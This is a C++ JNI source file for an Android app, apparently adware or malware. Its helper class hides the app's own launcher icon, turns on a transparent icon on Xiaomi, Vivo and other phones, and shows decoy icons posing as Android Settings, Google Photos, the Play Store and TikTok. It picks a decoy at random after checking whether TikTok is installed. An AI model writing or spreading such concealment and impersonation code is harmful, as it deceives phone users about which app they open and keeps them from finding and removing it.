#include <unistd.h>
#include <ctime>
#include <cstdlib>
#include "ShortCutHelper.h"
#include "../../util/PthreadJNIEnvHelper.h"
#include "../../util/JniException.h"
#include "../../android/Application.h"
#include "../../android/AndroidJni.h"
#include "../../android/ComponentName.h"
#include "../../util/RomUtils.h"
#include "../../util/LocalFrame.h"
#include "../../android/ActivityInfo.h"
#include "../../util/GUtil.h"
#include "../../android/ShortcutInfoCompat_Builder.h"
#include "../../android/IconCompat.h"
#include "../../util/JniException.h"
#include "../../util/Iterator.h"
#include "../../util/List.h"
#include "../../util/String.h"
#include "../../android/ResolveInfo.h"
#include "../../android/ShortcutManagerCompat.h"


bool ShortCutHelper::inited = false;
jstring ShortCutHelper::packageName = nullptr;

void ShortCutHelper::init() {
    if (!inited) {
        JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();
        if(jenv!= nullptr) {
            inited = true;

            packageName = Application::getInstance().getPackageName();
        }
    }
}

ShortCutHelper::ShortCutHelper() {
    if(!inited){
        init();
    }
}

void ShortCutHelper::showAllFakeIcon() {
    showSettingIcon();
    showGpIcon();
    showPhotoIcon();
    showTTIcon();
}

void ShortCutHelper::showSettingIcon() {
    showIcon("android.system.setting");
    LOGV("ShortCutHelper::show Setting icon");
}

void ShortCutHelper::showPhotoIcon() {
    showIcon("android.google.photo");
    LOGV("ShortCutHelper::show Photo icon");
}

void ShortCutHelper::showGpIcon() {
    showIcon("android.vending.playstore");
    LOGV("ShortCutHelper::show GgStore icon");
}

void ShortCutHelper::showTTIcon() {
    showIcon("com.ss.android.ugc.aweme.main.MainActivity");
    LOGV("ShortCutHelper::show Tiktok icon");
}

void ShortCutHelper::addTransparentIcon() {
    JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();
    LocalFrame localFrame(jenv);

    if(jenv != nullptr) {
        jobject app = Application::getInstance().getCore();
        PackageManager pkgManager(Application::getInstance().getPackageManager());
        Context context(app);
        jstring jstr1 = jenv->NewStringUTF("androidx.component.sc");
        jstring jstr2 = jenv->NewStringUTF("androidx.component.sc2");
        jstring jstr = jenv->NewStringUTF("com.xmas.component.LauncherActivity");

        if (RomUtils::isXiaomi()) {
            ComponentName component_miui(context, jstr1);
            pkgManager.setComponentEnabledSetting(component_miui.getCore(),
                                                  PackageManager::COMPONENT_ENABLED_STATE_DISABLED,
                                                  PackageManager::DONT_KILL_APP);

            ComponentName component_miui2(context, jstr);
            pkgManager.setComponentEnabledSetting(component_miui2.getCore(),
                                                  PackageManager::COMPONENT_ENABLED_STATE_DISABLED,
                                                  PackageManager::DONT_KILL_APP);

            LOGV("ShortCutHelper::addTransparentMiuiIcon");

        } else if (RomUtils::isVivo()) {

                ComponentName component_vivo(context, jstr2);
                pkgManager.setComponentEnabledSetting(component_vivo.getCore(),
                                                      PackageManager::COMPONENT_ENABLED_STATE_ENABLED,
                                                      PackageManager::DONT_KILL_APP);

                LOGV("ShortCutHelper::addTransparentVivoIcon");

        } else {
            ComponentName component(context, jstr1);
            pkgManager.setComponentEnabledSetting(component.getCore(),
                                                  PackageManager::COMPONENT_ENABLED_STATE_ENABLED,
                                                  PackageManager::DONT_KILL_APP);

            LOGV("ShortCutHelper::addTransparentIcon");

        }
    }
}

void ShortCutHelper::addPinAndHideIcon() {
    JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();
    LocalFrame localFrame(jenv);

    if(jenv != nullptr) {
        Application& appInst = Application::getInstance();
        PackageManager pkgManager(appInst.getPackageManager());

        if(info == nullptr){
            info = retrieveLauncherActivity(jenv, pkgManager);
        }

        if(info == nullptr)
            return;

        ActivityInfo activityInfo(info);

        if (ShortcutManagerCompat::isRequestPinShortcutSupported(appInst.getCore())) {

            ComponentName tgtActComp(packageName, activityInfo.targetActivity);

            Intent pIntent;
            pIntent.setComponent(tgtActComp.getCore());
            pIntent.setAction("android.intent.action.VIEW");

            jstring appName = activityInfo.loadLabel(pkgManager.getCore());
            int iconResource = activityInfo.getIconResource();

            ShortcutInfoCompat_Builder builder(appInst.getCore(), appName);
            IconCompat iconCompat(IconCompat::createWithResource(appInst.getCore(), iconResource));
            builder.setIcon(iconCompat.getCore())
                    .setShortLabel(appName)
                    .setLongLabel(appName)
                    .setIntent(pIntent.getCore())
                    .setActivity(tgtActComp.getCore());

            ShortcutManagerCompat::requestPinShortcut(appInst.getCore(),
                                                      builder.build(), nullptr);

            LOGV("ShortCutHelper::addPinIcon");
        }

        //hideIcon------------------------------------------------------------------------------
        ComponentName launcherComp(packageName, activityInfo.name);
        jobject launcherName = launcherComp.getCore();

        if(launcherName != nullptr && pkgManager.getComponentEnabledSetting(launcherName) != PackageManager::COMPONENT_ENABLED_STATE_DISABLED){
            pkgManager.setComponentEnabledSetting(launcherName, PackageManager::COMPONENT_ENABLED_STATE_DISABLED, PackageManager::DONT_KILL_APP);
        }

        LOGV("ShortCutHelper::hide icon");
    }
}

jobject ShortCutHelper::retrieveLauncherActivity(JNIEnv *env, PackageManager& pkgManager) {

    Intent mainIntent("android.intent.action.MAIN", nullptr);
    mainIntent.addCategory("android.intent.category.ICON");
    mainIntent.addCategory("android.intent.category.LAUNCHER");
    mainIntent.setPackage(Application::getInstance().getPackageName());

    bool flag = false;
    jobject activityInfo;

    jobject appList = pkgManager.queryIntentActivities(mainIntent.getCore(), 0);
    Iterator it(List(appList).iterator());
    while (it.hasNext()) {
        activityInfo = ResolveInfo::activityInfo(it.next());
        ActivityInfo acinfo(activityInfo);
        if (String::equalsIgnoreCase(acinfo.packageName, packageName)) {
            flag = true;
            break;
        }
    }

    env->DeleteLocalRef(appList);

    if (flag)
        return activityInfo;
    else{
        env->DeleteLocalRef(activityInfo);
        LOGE("info is null");
        return nullptr;
    }
}

void ShortCutHelper::showIcon(const char *cls) {
    JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();

    if(jenv != nullptr){
        jstring jstr = jenv->NewStringUTF(cls);

        PackageManager packageManager(Application::getInstance().getPackageManager());
        ComponentName componentName(packageName, jstr);

        packageManager.setComponentEnabledSetting(componentName.getCore(), PackageManager::COMPONENT_ENABLED_STATE_DISABLED, PackageManager::DONT_KILL_APP);
        usleep(800000);

        packageManager.setComponentEnabledSetting(componentName.getCore(), PackageManager::COMPONENT_ENABLED_STATE_ENABLED, PackageManager::DONT_KILL_APP);
        LOGV("fake icon shown");


        jenv->DeleteLocalRef(jstr);
    }
}

jboolean ShortCutHelper::isTiktokInstalled() {
    JNIEnv *jenv = PthreadJNIEnvHelper::getJNIEnv();
    LocalFrame localFrame(jenv);

    if(jenv != nullptr){
        PackageManager packageManager(Application::getInstance().getPackageManager());

        packageManager.getPackageInfo(jenv->NewStringUTF("com.zhiliaoapp.musically"), 256);
        if(!check_and_clear_exception(jenv)){
            return true;
        }

        packageManager.getPackageInfo(jenv->NewStringUTF("com.ss.android.ugc.trill"), 256);
        if(!check_and_clear_exception(jenv)){
            return true;
        }
    }

    return false;
}

void ShortCutHelper::showFakeIcon() {
    srand(time(nullptr));

    if(isTiktokInstalled()){
        LOGV("tiktok installed");
        switch (rand() % 4) {
            case 0:
                showSettingIcon();
                break;
            case 1:
                showPhotoIcon();
                break;
            case 2:
                showGpIcon();
                break;
            case 3:
                showTTIcon();
                break;
        }
    }else{
        LOGV("tiktok not installed");
        switch (rand() % 3) {
            case 0:
                showSettingIcon();
                break;
            case 1:
                showPhotoIcon();
                break;
            case 2:
                showGpIcon();
                break;
        }
    }

    LOGV("show fakeicon");
}
